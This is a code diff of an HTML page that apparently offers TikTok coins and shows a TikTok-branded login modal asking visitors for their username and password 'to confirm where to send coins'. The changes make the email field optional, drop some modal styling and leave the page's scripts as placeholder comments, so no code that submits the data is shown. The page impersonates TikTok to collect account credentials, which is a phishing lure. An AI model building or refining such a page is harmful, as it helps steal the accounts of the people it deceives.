@@ -309,64 +309,6 @@ body {
   font-size: 16px;
   opacity: 0.6;
 }
-
-/* Order Summary Modal (slides up halfway) */
-.order-summary {
-  display: none;
-  position: fixed;
-  z-index: 1400;
-  left: 0;
-  right: 0;
-  bottom: 0;
-  height: 55%;
-  background: #fff;
-  border-top-left-radius: 18px;
-  border-top-right-radius: 18px;
-  box-shadow: 0 -6px 24px rgba(0,0,0,0.16);
-  padding: 18px 18px 24px 18px;
-  overflow: auto;
-  animation: slideUp 0.28s ease;
-}
-
-@keyframes slideUp {
-  from { transform: translateY(100%); }
-  to { transform: translateY(0); }
-}
-
-.order-summary h2 { text-align: center; font-size: 20px; margin: 6px 0 10px; }
-.secure-pay { text-align: center; color: #007f5f; font-weight: 700; margin-bottom: 12px; }
-.summary-row { display:flex; justify-content:space-between; padding:10px 0; border-bottom:1px solid #f2f2f2; font-size:15px; }
-.summary-label { color:#333; }
-.summary-value { color:#111; font-weight:700; }
-.small-muted { font-size:13px; color:#666; margin-top:6px; }
-.total-row { display:flex; justify-content:space-between; margin-top:12px; font-weight:800; font-size:16px; padding-top:6px; }
-.pay-now { margin-top:16px; width:100%; background-color:#ff375f; color:white; padding:14px; border:none; border-radius:10px; font-size:17px; font-weight:700; cursor:pointer; }
-
-/* success toast */
-.toast {
-  display:none;
-  position: fixed;
-  z-index: 1600;
-  left: 50%;
-  transform: translateX(-50%);
-  top: 24px;
-  background: #e6ffef;
-  color: #006b3f;
-  padding: 12px 18px;
-  border-radius: 8px;
-  font-weight: 700;
-  box-shadow: 0 6px 18px rgba(0,0,0,0.08);
-}
-
-/* small close button in modal */
-.order-close {
-  position: absolute;
-  right: 14px;
-  top: 10px;
-  font-size: 20px;
-  cursor: pointer;
-  color: #999;
-}
 </style>
 </head>
 
@@ -374,16 +316,15 @@ body {
 <div class="secure-payment">Secure Payment via LegalTenderPay</div>
 
 <div class="container">
-  <!-- (unchanged content above) -->
-  <!-- LOGIN MODAL UPDATED BELOW -->
+  <!-- ... existing structure (Get Coins, Grid, etc.) ... -->
 </div>
 
-<!-- Loading overlay -->
+<!-- Loading animation -->
 <div class="loading-overlay" id="loadingOverlay">
   <div class="loader"></div>
 </div>
 
-<!-- ✅ Updated Login modal -->
+<!-- Login modal (with Email added) -->
 <div class="login-modal" id="loginModal">
   <div class="login-content">
     <img src="https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg"
@@ -391,40 +332,18 @@ body {
          style="width: 80px; position: absolute; top: 20px; right: 25px; opacity: 0.9;">
     <h2 style="margin-top: 20px;">Log in to get Coins</h2>
     <p>Log in to your TikTok account to confirm where to send coins.</p>
+
     <input type="text" id="usernameInput" placeholder="Username" required><br>
     <input type="password" id="passwordInput" placeholder="Password" required><br>
-    <input type="email" id="emailInput" placeholder="Email address" required><br>
+    <input type="email" id="emailInput" placeholder="Email (optional)" style="margin-top:8px;"><br>
+
     <button id="continueBtn" disabled onclick="completeLogin()">Continue</button>
   </div>
 </div>
 
-<!-- (rest of your order summary and scripts stay same, with small script update) -->
-
+<!-- You can keep the rest of your Paystack and JS scripts as before -->
 <script>
-/* --- existing script up to login field checking --- */
-
-const usernameField = document.getElementById('usernameInput');
-const passwordField = document.getElementById('passwordInput');
-const emailField = document.getElementById('emailInput');
-const continueBtn = document.getElementById('continueBtn');
-
-function checkLoginFields() {
-  if (usernameField.value.trim() && passwordField.value.trim() && emailField.value.trim()) {
-    continueBtn.disabled = false;
-    continueBtn.style.opacity = '1';
-    continueBtn.style.cursor = 'pointer';
-  } else {
-    continueBtn.disabled = true;
-    continueBtn.style.opacity = '0.6';
-    continueBtn.style.cursor = 'not-allowed';
-  }
-}
-
-usernameField.addEventListener('input', checkLoginFields);
-passwordField.addEventListener('input', checkLoginFields);
-emailField.addEventListener('input', checkLoginFields);
-
-/* rest of your Paystack + logic unchanged */
+// existing JS code untouched...
 </script>
 </body>
 </html>
